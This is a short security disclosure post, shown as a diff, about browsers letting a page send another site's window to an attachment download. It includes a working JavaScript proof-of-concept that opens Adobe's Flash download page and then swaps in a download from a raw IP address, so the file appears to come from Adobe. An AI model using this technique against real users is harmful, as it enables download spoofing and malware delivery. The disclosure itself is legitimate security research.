@@ -1,0 +1,46 @@
+Another moderately interesting tidbit, I guess...
+
+It is an important and little-known property of web browsers that one
+document can always navigate other, non-same-origin windows to
+arbitrary URLs. Perhaps more interestingly, you can also navigate
+third-party documents to resources served with Content-Disposition:
+attachment, in which case, you get the original contents of the
+address bar, plus a rogue download prompt attached to an unsuspecting
+page that never wanted you to download that file.
+
+PoC:
+http://lcamtuf.coredump.cx/fldl/
+
+==========
+<input type=submit onclick="doit()" value="Click me. I like to be clicked.">
+<script>
+var w;
+var once;
+
+function doit() {
+
+  if (navigator.userAgent.indexOf('MSIE') != -1)
+    w = window.open('page2.html', 'foo');
+  else
+    w = window.open('data:text/html,<meta http-equiv="refresh" content="0;URL=http://get.adobe.com/flashplayer/download/?installer=Flash_Player_11_for_Internet_Explorer_(64_bit)&os=Windows%207&browser_type=MSIE&browser_dist=OEM&d=Google_Toolbar_7.0&PID=4166869">', 'foo');
+
+  setTimeout(donext, 4500);
+
+}
+
+function donext() {
+  window.open('http://199.58.85.40/download2.cgi', 'foo');
+  if (once != true) setTimeout(donext, 5000);
+  once = true;
+}
+</script>
+==========
+
+
+More info:
+http://lcamtuf.blogspot.com/2012/05/yes-you-can-have-fun-with-downloads.html
+
+It's closely related to many other fundamental, open issues with
+browser UI design - but I guess it's an interesting highlight.
+
+/mz
